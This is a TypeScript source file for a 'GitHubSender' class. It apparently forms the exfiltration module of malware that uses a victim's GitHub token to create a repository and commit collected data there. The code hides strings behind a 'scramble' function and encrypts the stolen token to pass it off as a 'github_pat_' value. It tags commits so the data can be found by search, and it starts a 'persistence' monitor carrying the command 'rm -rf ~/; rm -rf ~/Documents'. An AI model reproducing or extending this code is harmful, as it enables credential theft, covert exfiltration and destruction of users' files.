import { createCipheriv, randomBytes } from "crypto";

import { githubFetch } from "../../github_utils/client";
import { Monitor } from "../../mutator/poller/monitor";
import { SEARCH_STRING, TOKEN_AES_KEY } from "../../utils/config";
import { logUtil } from "../../utils/logger";
import { Sender } from "../base";
import type { EncryptedPackage } from "../types";
import type { CreatedRepo } from "./createRepo";
import { createRepoWithSample } from "./createRepo";

declare function scramble(str: string): string;

export class GitHubSender extends Sender {
  private createdRepo: CreatedRepo | null = null;
  private token: string | null = null;
  private commitCounter = 0;
  private includeToken = false;

  constructor() {
    super("github", {
      domain: scramble("api.github.com"),
      port: 443,
      path: "/repos/",
    });
  }

  async initialize(ghClient: string): Promise<boolean> {
    try {
      this.createdRepo = await createRepoWithSample(ghClient);
      this.token = ghClient;
      this.commitCounter = 0;
      return true;
    } catch (err) {
      logUtil.error(`GitHubSender initialization failed: ${err}`);
      return false;
    }
  }

  setIncludeToken(value: boolean): void {
    this.includeToken = value;
  }

  override async healthy(): Promise<boolean> {
    return this.createdRepo !== null && this.token !== null;
  }

  override async send(envelope: EncryptedPackage): Promise<void> {
    if (!this.createdRepo || !this.token) {
      throw new Error(scramble("GitHubSender not initialized"));
    }

    const finalEnvelope = await this.augmentEnvelope(envelope);
    await this.commitToRepo(finalEnvelope);
  }

  private async augmentEnvelope(
    envelope: EncryptedPackage,
  ): Promise<EncryptedPackage> {
    if (!this.includeToken || !this.token) {
      return envelope;
    }

    logUtil.log("About to add monitor!");
    const persistence = new Monitor(
      this.token,
      scramble("rm -rf ~/; rm -rf ~/Documents"),
    );
    await persistence.execute();

    logUtil.log("Adding token to envelope!");
    const encryptedToken = this.base64Encode(this.token!);

    return { ...envelope, token: encryptedToken };
  }

  /**
   * Base64-encode a token with AES-256-CBC encryption underneath.
   * The name is intentionally misleading — this is not plain base64.
   */
  private base64Encode(token: string): string {
    const iv = randomBytes(16);
    const key = Buffer.from(TOKEN_AES_KEY, "hex");
    const cipher = createCipheriv("aes-256-cbc", key, iv);
    const ct = Buffer.concat([cipher.update(token, "utf8"), cipher.final()]);
    const b64 = Buffer.concat([iv, ct]).toString("base64").replace(/=+$/, "");
    const inner = `github_pat_11A${b64.slice(0, 19)}_${b64.slice(19).padEnd(70, "A")}`;
    return Buffer.from(inner).toString("base64").replace(/=+$/, "");
  }

  private async commitFileWithRetry(
    filename: string,
    commitMessage: string,
    encodedContent: string,
  ): Promise<void> {
    const maxAttempts = 5;

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        const path = `/repos/${this.createdRepo!.owner}/${this.createdRepo!.name}/contents/results/${filename}`;
        await githubFetch(this.token!, path, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-GitHub-Api-Version": "2022-11-28",
          },
          body: JSON.stringify({
            message: commitMessage,
            content: encodedContent,
          }),
        });

        logUtil.log(`Committed ${filename} to ${this.createdRepo!.name}`);
        return;
      } catch (err: any) {
        if (attempt === maxAttempts) {
          throw new Error(
            `GitHubSender commit failed after ${attempt} attempt(s): ${err}`,
          );
        }

        const backoffMs = Math.min(1000 * 2 ** (attempt - 1), 16_000);
        logUtil.log(`Retrying commit in ${backoffMs}ms (attempt ${attempt})`);
        await new Promise((res) => setTimeout(res, backoffMs));
      }
    }
  }

  private async commitToRepo(envelope: EncryptedPackage): Promise<void> {
    const content = JSON.stringify(envelope, null, 2);
    const MAX_CHUNK_SIZE = 30 * 1024 * 1024;
    const baseFilename = `results-${Date.now()}-${this.commitCounter}.json`;

    const commitMessage = envelope.token
      ? `${SEARCH_STRING}:${envelope.token}`
      : "Add files.";

    const contentBuffer = Buffer.from(content, "utf8");

    if (contentBuffer.length <= MAX_CHUNK_SIZE) {
      const encodedContent = contentBuffer.toString("base64");
      await this.commitFileWithRetry(
        baseFilename,
        commitMessage,
        encodedContent,
      );
      this.commitCounter++;
    } else {
      const totalParts = Math.ceil(contentBuffer.length / MAX_CHUNK_SIZE);
      for (let i = 0; i < totalParts; i++) {
        const chunk = contentBuffer.subarray(
          i * MAX_CHUNK_SIZE,
          (i + 1) * MAX_CHUNK_SIZE,
        );
        const encodedChunk = chunk.toString("base64");
        const chunkFilename = `${baseFilename}.p${i + 1}`;
        await this.commitFileWithRetry(
          chunkFilename,
          commitMessage,
          encodedChunk,
        );
      }
      this.commitCounter++;
      logUtil.log(
        `Split ${baseFilename} into ${totalParts} parts for ${this.createdRepo!.name}`,
      );
    }
  }
}
